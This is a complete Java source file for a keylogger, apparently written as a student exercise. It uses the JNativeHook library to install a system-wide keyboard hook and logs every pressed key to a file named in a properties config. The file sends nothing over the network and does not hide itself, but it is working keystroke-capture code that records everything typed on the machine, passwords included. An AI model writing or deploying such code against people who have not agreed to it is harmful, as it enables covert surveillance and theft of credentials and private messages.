
package leasok4a_sewpro;

import java.io.FileInputStream;  // File Reader Library
import java.io.IOException;
import java.io.InputStream;        // Ist die Abstraktklasse fur alle iniputStreams Libraryes.
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Properties;        
import java.util.logging.FileHandler; //The FileHandler can  write to a specified file
import java.util.logging.Logger; // A Logger object is used to log messages for a specific system or application component
import java.util.logging.SimpleFormatter;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;


public class KeyLogger implements NativeKeyListener {
	String configFilePath = null;
	Logger logger = null;
	FileHandler fileHandler = null;
	SimpleFormatter simpleFormatter = null;
	InputStream inputStream = null;
	Properties properties = null;
	Path currentRelativePath = null;

	/**
	 * The constructor.
	 * @throws IOException
	 */
	public KeyLogger() throws IOException {
		logger = Logger.getLogger("Key Log");
		currentRelativePath = Paths.get("");
		inputStream = new FileInputStream("Config.properties");
		properties = new Properties();
		properties.load(inputStream);
		configFilePath = properties.getProperty("FilePath");
		fileHandler = new FileHandler(configFilePath);
		logger.addHandler(fileHandler);
		simpleFormatter = new SimpleFormatter();
		fileHandler.setFormatter(simpleFormatter);
	}

	/**
	 * Overridden method to capture the pressed keys.
	 */
	@Override
	public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
		logger.info("Key pressed: " + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
	}

	/**
	 * Overridden method to capture released keys.
	 */
	@Override
	public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
	}

	/**
	 * Overridden method to capture the typed keys.
	 */
	@Override
	public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
	}

	/**
	 * The main method.
	 * @param arguments - Command-line arguments
	 * @throws IOException
	 * @throws NativeHookException
	 */
	public static void main(String arguments[]) throws IOException, NativeHookException {
		GlobalScreen.registerNativeHook();
		GlobalScreen.addNativeKeyListener(new KeyLogger());
	}
}